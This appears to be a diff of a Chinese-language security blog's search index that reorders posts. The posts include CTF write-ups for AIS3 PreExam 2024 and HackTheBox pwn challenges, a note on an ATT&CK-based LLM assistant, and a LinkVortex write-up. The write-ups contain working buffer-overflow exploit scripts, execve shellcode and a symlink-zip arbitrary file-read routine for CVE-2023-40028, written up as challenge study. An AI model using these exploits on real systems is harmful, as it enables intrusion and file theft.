@@ -1,6 +1,135 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>AIS3 PreExam2024</title>
+    <url>/2024/08/10/AIS3-PreExam2024/</url>
+    <content><![CDATA[<blockquote>
+<p>總共解出5題 ,167th</p>
+</blockquote>
+<h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HykIbBeV0.png"
+                      alt="image"
+                ></p>
+<h2 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h2><blockquote>
+<p>輸入 00 會跳過<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1PFWBxVC.png"
+                      alt="image"
+                ><br>就可以拿走最後一顆</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/rJ2o-BgNA.png"
+                      alt="image"
+                ></p>
+<h2 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/B1xOupgNR.png"
+                      alt="image"
+                ></p>
+<p>flag: <code>AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</code></p>
+<h2 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h2><blockquote>
+<p>把sleep time改短一點 ,但不能是0</p>
+</blockquote>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/S1bN32gN0.png"
+                      alt="image"
+                ></p>
+<blockquote>
+<p>flag印完就消失ㄌ<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJtmeTx4R.png"
+                      alt="image"
+                ></p>
+</blockquote>
+<p>flag: AIS3{You_are_the_master_of_time_management!!!!?}</p>
+<h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><blockquote>
+<p>通靈題</p>
+</blockquote>
+<ul>
+<li>把封包<code>G-Code</code>的部分截下來用線上編輯器看<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/ByJ3u0xVC.png"
+                      alt="image"
+                ></li>
+</ul>
+<h2 id="mathter"><a href="#mathter" class="headerlink" title="mathter"></a>mathter</h2><ul>
+<li>沒解出來</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">50001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;y&#x27;</span>*<span class="number">12</span>+ p64(<span class="number">0x40199b</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">889275714</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;]&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/H1pPLbz4C.png"
+                      alt="image"
+                ></p>
+]]></content>
+      <tags>
+        <tag>ais3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>威脅情資 LLM 應用</title>
+    <url>/2024/11/26/RAG/</url>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上學期自主學習因應老師要求，以 ATT&amp;CK 框架為基礎製作可以在駭客攻防課程中使用的<strong>攻擊鏈</strong>助教，最後以應用技術效率對比結尾。<br>但我覺得應該做成情資分析，例如：輸入情報分析 Technique | KillChain | Mitigations 等 ，並轉換成結構化數據，以 LLM 做 Data pre-process，也可以有更多使用方向。</p>
+<p>主要實作方式：</p>
+<ol>
+<li>LLama2<ul>
+<li>RAG</li>
+<li>LLM Finetune</li>
+</ul>
+</li>
+<li>ChatGPT3.5-turbo</li>
+</ol>
+<p>最後做出來的效果是 Finetune &gt; GPT3.5 &gt; RAG ，但Finetune所需要的製作成本比 RAG 高出超級多，所以會建議在製作 LLM 聊天客服應用時還是以 GPT + RAG 打底。</p>
+<h3 id="文章架構"><a href="#文章架構" class="headerlink" title="文章架構"></a>文章架構</h3><p>這個文章應該會是一個系列，總共分三篇</p>
+<ol>
+<li>RAG 應用搭建</li>
+<li>LLM Finetune</li>
+<li>Fintune 後的模型格式轉換及模型壓縮</li>
+</ol>
+<p>最後做出來的成果主要以 Llama2 RAG 和 Finetune 的效果、硬體資源做評估，主要結論在上面。</p>
+<h3 id="Repositories"><a href="#Repositories" class="headerlink" title="Repositories"></a>Repositories</h3><p>實作範例</p>
+<blockquote>
+<p>做完 LangChain 版本就換了🤡🤡 有些可能沒辦法跑，但邏輯都差不多</p>
+</blockquote>
+<ol>
+<li><p>RAG系統<br><a class="link"   href="https://github.com/Chihhhs/Assistant_for_Attck" >Assistant System<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</li>
+<li><p>微調訓練及模型轉換<br><a class="link"   href="https://github.com/Chihhhs/TRL_Trainer" >TRL_Trainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</li>
+<li><p>Model 主要存放在 HuggingFace 和 OLLama 平台上。</p>
+<ol>
+<li><a class="link"   href="https://huggingface.co/chihhh/attack-llama-2-7b-chat-lora" >LoRA WeightFile<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://huggingface.co/chihhh/llama2-chat-attck-gguf" >GGUF File<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link"   href="https://www.ollama.com/chih/llama-2-chat-attack" >Ollama Interface<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+</ol>
+</li>
+</ol>
+<h2 id="系列文"><a href="#系列文" class="headerlink" title="系列文"></a>系列文</h2><ol>
+<li><a href="./RAG.md">研究介紹</a></li>
+<li>[RAG簡介] 還沒寫</li>
+<li>[Finetune簡介] 還沒寫</li>
+</ol>
+]]></content>
+      <tags>
+        <tag>Research</tag>
+        <tag>LLM</tag>
+        <tag>Finetune</tag>
+        <tag>RAG</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Drop File Malware 靜態分析</title>
     <url>/2025/01/10/Malware/</url>
     <content><![CDATA[<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><ul>
@@ -135,59 +264,8 @@
 <h2 id="VT"><a href="#VT" class="headerlink" title="VT"></a>VT</h2><p><a class="link"   href="https://www.virustotal.com/gui/file/d71a7b1efc4a06afffd94f526ad496368a9c4489296076449c74eec2d76ee4ca" >VT Check<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 ]]></content>
       <tags>
+        <tag>Research</tag>
         <tag>Malware</tag>
-        <tag>Research</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>威脅情資 LLM 應用</title>
-    <url>/2024/11/26/RAG/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上學期自主學習因應老師要求，以 ATT&amp;CK 框架為基礎製作可以在駭客攻防課程中使用的<strong>攻擊鏈</strong>助教，最後以應用技術效率對比結尾。<br>但我覺得應該做成情資分析，例如：輸入情報分析 Technique | KillChain | Mitigations 等 ，並轉換成結構化數據，以 LLM 做 Data pre-process，也可以有更多使用方向。</p>
-<p>主要實作方式：</p>
-<ol>
-<li>LLama2<ul>
-<li>RAG</li>
-<li>LLM Finetune</li>
-</ul>
-</li>
-<li>ChatGPT3.5-turbo</li>
-</ol>
-<p>最後做出來的效果是 Finetune &gt; GPT3.5 &gt; RAG ，但Finetune所需要的製作成本比 RAG 高出超級多，所以會建議在製作 LLM 聊天客服應用時還是以 GPT + RAG 打底。</p>
-<h3 id="文章架構"><a href="#文章架構" class="headerlink" title="文章架構"></a>文章架構</h3><p>這個文章應該會是一個系列，總共分三篇</p>
-<ol>
-<li>RAG 應用搭建</li>
-<li>LLM Finetune</li>
-<li>Fintune 後的模型格式轉換及模型壓縮</li>
-</ol>
-<p>最後做出來的成果主要以 Llama2 RAG 和 Finetune 的效果、硬體資源做評估，主要結論在上面。</p>
-<h3 id="Repositories"><a href="#Repositories" class="headerlink" title="Repositories"></a>Repositories</h3><p>實作範例</p>
-<blockquote>
-<p>做完 LangChain 版本就換了🤡🤡 有些可能沒辦法跑，但邏輯都差不多</p>
-</blockquote>
-<ol>
-<li><p>RAG系統<br><a class="link"   href="https://github.com/Chihhhs/Assistant_for_Attck" >Assistant System<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-</li>
-<li><p>微調訓練及模型轉換<br><a class="link"   href="https://github.com/Chihhhs/TRL_Trainer" >TRL_Trainer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-</li>
-<li><p>Model 主要存放在 HuggingFace 和 OLLama 平台上。</p>
-<ol>
-<li><a class="link"   href="https://huggingface.co/chihhh/attack-llama-2-7b-chat-lora" >LoRA WeightFile<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://huggingface.co/chihhh/llama2-chat-attck-gguf" >GGUF File<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-<li><a class="link"   href="https://www.ollama.com/chih/llama-2-chat-attack" >Ollama Interface<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
-</ol>
-</li>
-</ol>
-<h2 id="系列文"><a href="#系列文" class="headerlink" title="系列文"></a>系列文</h2><ol>
-<li><a href="./RAG.md">研究介紹</a></li>
-<li>[RAG簡介] 還沒寫</li>
-<li>[Finetune簡介] 還沒寫</li>
-</ol>
-]]></content>
-      <tags>
-        <tag>Research</tag>
-        <tag>LLM</tag>
-        <tag>Finetune</tag>
-        <tag>RAG</tag>
       </tags>
   </entry>
   <entry>
@@ -564,144 +642,6 @@
       </tags>
   </entry>
   <entry>
-    <title>AIS3 PreExam2024</title>
-    <url>/2024/08/10/AIS3-PreExam2024/</url>
-    <content><![CDATA[<blockquote>
-<p>總共解出5題 ,167th</p>
-</blockquote>
-<h2 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HykIbBeV0.png"
-                      alt="image"
-                ></p>
-<h2 id="Quantum-Nim-Heist"><a href="#Quantum-Nim-Heist" class="headerlink" title="Quantum Nim Heist"></a>Quantum Nim Heist</h2><blockquote>
-<p>輸入 00 會跳過<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/S1PFWBxVC.png"
-                      alt="image"
-                ><br>就可以拿走最後一顆</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/rJ2o-BgNA.png"
-                      alt="image"
-                ></p>
-<h2 id="Evil-Calculator"><a href="#Evil-Calculator" class="headerlink" title="Evil Calculator"></a>Evil Calculator</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/B1xOupgNR.png"
-                      alt="image"
-                ></p>
-<p>flag: <code>AIS3&#123;7RiANG13_5NAK3_I5_50_3Vi1&#125;</code></p>
-<h2 id="The-Long-Print"><a href="#The-Long-Print" class="headerlink" title="The Long Print"></a>The Long Print</h2><blockquote>
-<p>把sleep time改短一點 ,但不能是0</p>
-</blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/S1bN32gN0.png"
-                      alt="image"
-                ></p>
-<blockquote>
-<p>flag印完就消失ㄌ<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HJtmeTx4R.png"
-                      alt="image"
-                ></p>
-</blockquote>
-<p>flag: AIS3{You_are_the_master_of_time_management!!!!?}</p>
-<h2 id="Three-Dimensional-Secret"><a href="#Three-Dimensional-Secret" class="headerlink" title="Three Dimensional Secret"></a>Three Dimensional Secret</h2><blockquote>
-<p>通靈題</p>
-</blockquote>
-<ul>
-<li>把封包<code>G-Code</code>的部分截下來用線上編輯器看<br><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/ByJ3u0xVC.png"
-                      alt="image"
-                ></li>
-</ul>
-<h2 id="mathter"><a href="#mathter" class="headerlink" title="mathter"></a>mathter</h2><ul>
-<li>沒解出來</li>
-</ul>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;chals1.ais3.org&quot;</span>,<span class="number">50001</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;y&#x27;</span>*<span class="number">12</span>+ p64(<span class="number">0x40199b</span>) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+p64(<span class="number">889275714</span>)</span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;:&#x27;</span>,<span class="string">b&#x27;q&#x27;</span>)</span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;]&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<h2 id="result"><a href="#result" class="headerlink" title="result"></a>result</h2><p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/H1pPLbz4C.png"
-                      alt="image"
-                ></p>
-]]></content>
-      <tags>
-        <tag>ais3</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Blog Banner</title>
-    <url>/2024/12/10/head/</url>
-    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
-<li>CTF WriteUps</li>
-<li>Red Team</li>
-<li>courses</li>
-<li>Tools Cheatsheet</li>
-<li>Competition</li>
-<li>Research</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>cover</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HackTheBox CTF Try Out - pwn</title>
-    <url>/2024/12/10/htb-ctf/</url>
-    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
-<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
-<ul>
-<li>read function disassemble</li>
-</ul>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
-                      alt="images"
-                ></p>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
-
-<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
-<p>not yet</p>
-</blockquote>
-<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
-<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
-</ul>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
-                      alt="images"
-                ></p>
-<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
-<p>ret2dl_resolve</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>HTB</tag>
-        <tag>CTF</tag>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Web fuzzer cheatsheet</title>
     <url>/2024/11/01/ffuf/</url>
     <content><![CDATA[<h2 id="dirb"><a href="#dirb" class="headerlink" title="dirb"></a>dirb</h2><blockquote>
@@ -787,6 +727,66 @@
       <tags>
         <tag>fuzzer</tag>
         <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Blog Banner</title>
+    <url>/2024/12/10/head/</url>
+    <content><![CDATA[<h2 id="Blog-summary"><a href="#Blog-summary" class="headerlink" title="Blog summary"></a>Blog summary</h2><ul>
+<li>CTF WriteUps</li>
+<li>Red Team</li>
+<li>courses</li>
+<li>Tools Cheatsheet</li>
+<li>Competition</li>
+<li>Research</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>cover</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox CTF Try Out - pwn</title>
+    <url>/2024/12/10/htb-ctf/</url>
+    <content><![CDATA[<h2 id="HackTheBox-CTF-Try-Out"><a href="#HackTheBox-CTF-Try-Out" class="headerlink" title="HackTheBox CTF Try Out"></a>HackTheBox CTF Try Out</h2><p>HackTheBox 平台上的新手導向 CTF</p>
+<p><a class="link"   href="https://ctf.hackthebox.com/event/details/ctf-try-out-1434" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Regularity"><a href="#Regularity" class="headerlink" title="Regularity"></a>Regularity</h3><p>這題的 read function 中有一個 overflow<br>因爲他什麼保護都沒開所以我們只需要把shellcode 寫進 stack 中，利用 <code>jmp rsi</code> gadget 就會跳到寫入 shellcode 的地方</p>
+<ul>
+<li>read function disassemble</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/HJEwKiBNkx.png"
+                      alt="images"
+                ></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">rom pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;94.237.53.5&#x27;</span>,<span class="number">59584</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x402000</span></span><br><span class="line"></span><br><span class="line">sc =  asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        xor rax ,rax</span></span><br><span class="line"><span class="string">        mov rbx , 0x68732F6E69622F</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor rsi, rsi</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        mov rax, 0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># or asm(shellcraft.sh())</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># lea    rsi,[rsp]</span></span><br><span class="line">jmp_rsi = <span class="number">0x401041</span></span><br><span class="line"></span><br><span class="line">p = flat(sc, <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x100</span>-<span class="built_in">len</span>(sc)),jmp_rsi)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;?&#x27;</span>,p)</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">b&#x27;cat flag.*&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h4 id="為什麼是塞-0x100-不是-0x108"><a href="#為什麼是塞-0x100-不是-0x108" class="headerlink" title="為什麼是塞 0x100 不是 0x108"></a>為什麼是塞 0x100 不是 0x108</h4><p>這支程式在 function prologue&amp;Epilogue 都沒動到rbp，因為這樣所以不需要 + 0x8 蓋過 rbp</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">現代 x86-64 編譯器不修改 rbp 是合理的，尤其是函數使用 stack pointer (rsp) 來存取局部變數和函數參數，而不是使用 base pointer (rbp) 。</span><br><span class="line">現代編譯器（例如 GCC 和 Clang）在最佳化模式下會省略對 rbp 的操作，從而減少不必要的指令。</span><br><span class="line">這種方法叫做 frame pointer omission (FPO)。</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Abyss"><a href="#Abyss" class="headerlink" title="Abyss"></a>Abyss</h3><blockquote>
+<p>not yet</p>
+</blockquote>
+<h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><ul>
+<li>比對字串後有一個 <code>fgets</code>的 overflow 跳到 <code>escape_plan()</code> 就會輸出 flag</li>
+</ul>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;94.237.62.166&quot;</span> , <span class="number">45685</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="string">b&#x27;a&#x27;</span>*<span class="number">56</span> +p64(<span class="number">0x401256</span>) <span class="comment"># push rbp 後面</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>,<span class="string">b&#x27;69&#x27;</span>) <span class="comment"># 第一次輸入完會比對字串 ==69 ，之後還有一次輸入有 Overflow</span></span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;&gt;&gt;&#x27;</span>, p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://hackmd.io/_uploads/SJEno0BZ1g.png"
+                      alt="images"
+                ></p>
+<h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><blockquote>
+<p>ret2dl_resolve</p>
+</blockquote>
+]]></content>
+      <tags>
+        <tag>HTB</tag>
+        <tag>CTF</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
@@ -885,7 +885,7 @@
                       alt="image"
                 ></a></p>
 <p><a class="link"   href="https://medium.com/@mukhammadiyev20040/linkvortex-htb-write-up-5fbc66cc0081" ><i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#71;&#104;&#x6f;&#115;&#x74;&#x40;&#53;&#46;&#x35;&#57;&#x2e;&#x31;" >&#71;&#104;&#x6f;&#115;&#x74;&#x40;&#53;&#46;&#x35;&#57;&#x2e;&#x31;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
+<h2 id="CVE-2023-40028"><a href="#CVE-2023-40028" class="headerlink" title="CVE-2023-40028"></a>CVE-2023-40028</h2><p>CVE-2023-40028 存在於 <a class="link"   href="mailto:&#x47;&#104;&#x6f;&#115;&#x74;&#64;&#x35;&#x2e;&#x35;&#57;&#46;&#49;" >&#x47;&#104;&#x6f;&#115;&#x74;&#64;&#x35;&#x2e;&#x35;&#57;&#46;&#49;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 版本之前的版本中。 該漏洞允許<strong>經過身份驗證</strong>的用戶上傳符號連結（symlink）文件，從而可能導致對主機操作系統上任意文件的讀取。</p>
 <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><figcaption><span>genrate_exp</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">generate_exploit</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">local</span> FILE_TO_READ=<span class="variable">$1</span></span><br><span class="line">  IMAGE_NAME=$(<span class="built_in">tr</span> -dc A-Za-z0-9 &lt;/dev/urandom | <span class="built_in">head</span> -c 13; <span class="built_in">echo</span>)</span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/</span><br><span class="line">  <span class="built_in">ln</span> -s <span class="variable">$FILE_TO_READ</span> <span class="variable">$PAYLOAD_PATH</span>/content/images/2024/<span class="variable">$IMAGE_NAME</span>.png</span><br><span class="line">  zip -r -y <span class="variable">$PAYLOAD_ZIP_NAME</span> <span class="variable">$PAYLOAD_PATH</span>/ &amp;&gt;/dev/null</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
 <ul>
@@ -917,7 +917,7 @@
 
 <hr>
 <blockquote>
